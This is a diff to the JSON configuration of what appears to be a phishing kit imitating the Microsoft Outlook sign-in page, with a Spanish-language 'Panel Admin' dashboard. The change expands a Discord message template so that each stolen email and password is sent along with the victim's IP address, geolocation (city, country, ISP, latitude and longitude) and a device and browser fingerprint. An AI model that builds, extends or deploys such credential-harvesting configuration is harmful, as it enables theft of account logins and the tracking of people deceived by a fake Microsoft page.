@@ -6,7 +6,7 @@
   "dashboardTitle": "Panel Admin",
   "loginBgType": "image",
   "loginBgImage": "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg",
-  "discordMessageTemplate": "?? PRUEBA: {email} - {password}",
+  "discordMessageTemplate": "🔐 Nuevo inicio de sesión\n──────────────────────────\nUsuario: {email}\nContraseña: {password}\nIP: {ip}\nCiudad: {geoCity}\nPaís: {geoCountry} ({geoCountryCode})\nISP: {geoIsp}\nLatitud: {geoLatitude}\nLongitud: {geoLongitude}\n\nDispositivo:\nMemoria RAM: {deviceMemory}\nCPU: {cpuCores}\nBatería: {batteryLevel} (Cargando: {batteryCharging})\n\nNavegador: {userAgent}\nIdioma: {language}\nPantalla: {screenResolution} ({colorDepth} bits)\nZona horaria: {timezone}\n──────────────────────────\nHora: {timestamp}",
   "pageSubtitle": "para continuar a Outlook.",
   "newUserText": "¿Eres nuevo en Microsoft?"
 }
